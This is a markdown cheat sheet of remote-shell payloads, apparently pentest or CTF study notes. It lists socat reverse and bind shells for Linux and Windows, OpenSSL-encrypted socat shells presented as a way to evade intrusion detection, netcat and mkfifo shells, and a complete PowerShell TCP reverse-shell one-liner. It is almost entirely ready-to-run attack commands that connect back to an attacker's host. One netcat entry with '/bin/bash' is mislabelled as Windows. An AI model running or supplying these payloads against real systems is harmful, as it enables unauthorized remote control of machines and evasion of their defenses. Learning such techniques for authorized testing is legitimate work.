```bash

```

# Socat
Socat is similar to Netcat. It works as a connector between two points.

## Reverse Shells
### Syntax for A Listener/Attacker
* `socat TCP-L:<port> -` [ Two points (a listening port, and standard input) and connecting them together]
  
###  To Connect Back on A Windows Target
* `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` [The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.]
###  To Connect Back on A Linux Target
* `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

## Bind Shells
### On A Linux Target
* `socat TCP-L:<PORT> EXEC:"bash -li"`
### On A Windows Target
* `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`
### Attacker (Regardless of target platform)
* `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

## A Fully Stable TTY Reverse Shell Using Socat
```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
We are passing in the current TTY as a file and setting the echo to be zero

<br> <br> <br><br> <br> <br>
# Socat Encrypted Shells
Encryption helps us bypass IDS <br>
We Will use OPENSSL instead of TCP <br>
## Generate A Certificate
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
## Merge 2 files into one
```bash
cat shell.key shell.crt > shell.pem
```
## Set Up Reverse Shell Listener on Attacker
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.
## To Connect Back on Target Machine
```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

## Blind Shell
### Target
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

### Attacker
```bash
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
------------------------------------------------------------------------------------------------------------------
<br> <br> <br><br> <br> <br>
# Common Shell Payloads
## Windows
### Bind Shell; Set Up A Listener
```bash
nc -lvnp <PORT> -e /bin/bash
```
### Reverse Shell; Connecting Back
```bash
nc <LOCAL-IP> <PORT> -e /bin/bash
```

## Linux
### Bind Shell; Create A Listener
```bash
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

### Reverse Shell; Connecting Back
```bash
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
### Create A PowerShell Reverse Shell
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
* Replace the IP and port
* Will work on cmd.exe shell or webshell
